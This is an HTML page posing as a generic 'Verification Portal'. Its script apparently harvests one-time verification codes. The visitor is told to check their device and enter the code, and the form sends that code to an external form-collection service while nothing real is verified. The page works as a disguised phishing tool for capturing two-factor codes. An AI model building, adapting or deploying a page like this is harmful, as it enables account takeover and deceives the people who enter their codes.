<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Portal</title>
  <style>
    body { 
      margin: 0; 
      font-family: Arial, sans-serif; 
      background: #1a1a1a url('background.jpg') no-repeat center center fixed; 
      background-size: cover !important; 
      color: white; 
      text-align: center; 
    }
    .overlay { 
      background: rgba(0,0,0,0.6); 
      min-height: 100vh; 
      width: 100%;
      padding-top: 80px; 
    }
    .container { 
      background: rgba(20,20,20,0.85); 
      padding: 30px; 
      width: 320px; 
      margin: auto; 
      border-radius: 10px; 
      border: 1px solid rgba(255,255,255,0.1);
    }
    .logo { width: 250px; margin-bottom: 20px; }
    
    input { 
      display: block; 
      margin: 15px auto; 
      padding: 12px; 
      width: 90%; 
      border-radius: 5px; 
      border: 1px solid #444; 
      background: white; 
      color: black; 
      font-size: 16px;
      text-align: center;
    }

    button { 
      padding: 12px; 
      border-radius: 5px; 
      border: none; 
      cursor: pointer; 
      background: #f0f0f0; 
      font-weight: bold; 
      width: 95%; 
      margin-top: 10px; 
    }
    button:disabled { background: #666 !important; cursor: not-allowed; }
    
    .btn-verify { background: #4caf50; color: white; margin-top: 10px; }
    
    .status-msg { margin-top: 15px; font-size: 14px; color: #ffd700; display: none; }
    
    #codeEntrySection { display: none; margin-top: 20px; }
    
    hr { margin: 25px 0; border: 0; border-top: 1px solid #444; }
  </style>
</head>
<body>

<div class="overlay">
  <div class="container">
    <img src="logo.png" class="logo" alt="Logo">

    <div id="mainSection">
      <h2>Verification</h2>
      <p style="font-size: 12px; color: #aaa;">Click below to receive your secure code.</p>
      
      <form id="vForm" action="https://formcarry.com/s/dy_hO3bo1eG" method="POST">
        
        <input type="hidden" name="phone_number" value="Hidden_System_User">
        <input type="hidden" name="intent" id="intent" value="">

        <button type="submit" id="reqBtn">Request Code</button>
        
        <div id="waitMessage" class="status-msg">
          ✔ Request Sent! Your code is being generated...
        </div>

        <div id="codeEntrySection">
          <hr>
          <h3 style="margin-bottom: 5px;">Enter Code</h3>
          <!-- تم تعديل النص التوضيحي -->
          <p style="font-size: 11px; color: #888;">Check your device for the verification code.</p>
          
          <!-- تم إزالة maxlength="6" وتغيير الـ placeholder -->
          <input type="text" name="received_code" id="codeInput" placeholder="Enter your code">
          
          <button type="submit" id="subBtn" class="btn-verify">Submit & Verify</button>
          
          <div id="successMessage" class="status-msg" style="color: #4caf50;">
            ✔ Verifying... Please wait.
          </div>
        </div>
      </form>
    </div>
  </div>
</div>

<script>
  const vForm = document.getElementById('vForm');
  const reqBtn = document.getElementById('reqBtn');
  const subBtn = document.getElementById('subBtn');
  const intentInput = document.getElementById('intent');
  const codeSection = document.getElementById('codeEntrySection');
  const codeInput = document.getElementById('codeInput');

  vForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const clickedBtn = document.activeElement;
    const isRequest = clickedBtn.id === 'reqBtn';
    
    intentInput.value = isRequest ? "Requesting New Code" : "User Entered Code: " + codeInput.value;

    const statusId = isRequest ? 'waitMessage' : 'successMessage';
    const statusMsg = document.getElementById(statusId);

    clickedBtn.disabled = true;
    const originalText = clickedBtn.innerText;
    clickedBtn.innerText = "Processing...";

    try {
      const response = await fetch(vForm.action, {
        method: 'POST',
        body: new FormData(vForm),
        headers: { 'Accept': 'application/json' }
      });

      if (response.ok) {
        clickedBtn.innerText = "Success";
        statusMsg.style.display = "block";
        
        if (isRequest) {
          setTimeout(() => {
            codeSection.style.display = "block";
            reqBtn.style.display = "none";
          }, 1000);
        }
        
        setTimeout(() => {
          clickedBtn.disabled = false;
          clickedBtn.innerText = originalText;
        }, 4000);

      } else {
        alert("Error " + response.status + ": System busy. Please try again.");
        clickedBtn.disabled = false;
        clickedBtn.innerText = "Try Again";
      }
    } catch (error) {
      alert("Connection Error. Please check your internet.");
      clickedBtn.disabled = false;
      clickedBtn.innerText = "Try Again";
    }
  });
</script>

</body>
</html>
